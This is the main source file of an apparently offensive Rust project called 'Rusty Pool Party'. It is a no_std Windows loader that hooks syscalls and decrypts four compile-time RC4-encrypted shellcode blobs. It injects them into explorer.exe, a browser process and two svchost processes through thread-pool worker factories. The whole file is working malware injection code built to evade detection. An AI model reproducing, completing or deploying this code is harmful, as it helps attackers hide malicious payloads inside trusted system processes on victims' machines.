#![no_std]
#![no_main]

extern crate alloc;
use core::panic::PanicInfo;

mod print_no_std;
mod syscall;
mod hash_macro;
mod types;
mod utils;
mod pool_party;
mod rc4;

mod global_allocator;
use global_allocator::CustomAllocator;
#[global_allocator]
static BEE_NO_STD_ALLOCATOR: CustomAllocator = CustomAllocator;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    #[cfg(debug_assertions)]
    crate::print_no_std::output_debug_string("panic!\n");

    loop {}
}

#[unsafe(no_mangle)]
pub extern "C" fn rust_eh_personality() {}

#[unsafe(no_mangle)]
pub extern "C" fn atexit(_: *const ()) -> i32 {
    0
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn main() -> i32 {

    debug_println!("=== Rusty Pool Party ===\n");
    syscall::initialize_hooks();

    unsafe { pool_party::find_processes_with_worker_factory(); }

    // Load and encrypt all 4 shellcodes for different targets
    // Each shellcode gets RC4-encrypted at compile-time with a unique random key
    // Decryption happens right before memcpy during injection
    let alarm_shellcode_encrypted = encrypt_bytes!(include_bytes!("../alarm_shellcode.bin"));
    let pipe_master_shellcode_encrypted = encrypt_bytes!(include_bytes!("../pipe_master_shellcode.bin"));
    let file_shellcode_encrypted = encrypt_bytes!(include_bytes!("../file_shellcode.bin"));
    let com_shellcode_encrypted = encrypt_bytes!(include_bytes!("../com_shellcode.bin"));

    debug_println!("\n[*] Starting multi-process injection with 4 RC4-encrypted shellcodes");
    debug_println!("[*] - explorer.exe: file_shellcode (encrypted)");
    debug_println!("[*] - browser: com_shellcode (encrypted)");
    debug_println!("[*] - svchost #1: alarm_shellcode (encrypted)");
    debug_println!("[*] - svchost #2: pipe_master_shellcode (encrypted)");

    let status = unsafe {
        pool_party::inject_multi_target(
            &file_shellcode_encrypted,         // explorer.exe
            &com_shellcode_encrypted,          // browser
            &alarm_shellcode_encrypted,        // svchost #1
            &pipe_master_shellcode_encrypted   // svchost #2
        )
    };

    if status != 0 {
        debug_println!("\n[-] Multi-injection failed");
    } else {
        debug_println!("\n[+] Multi-injection completed successfully!");
    }

    syscall::destroy_hooks();
    0
}
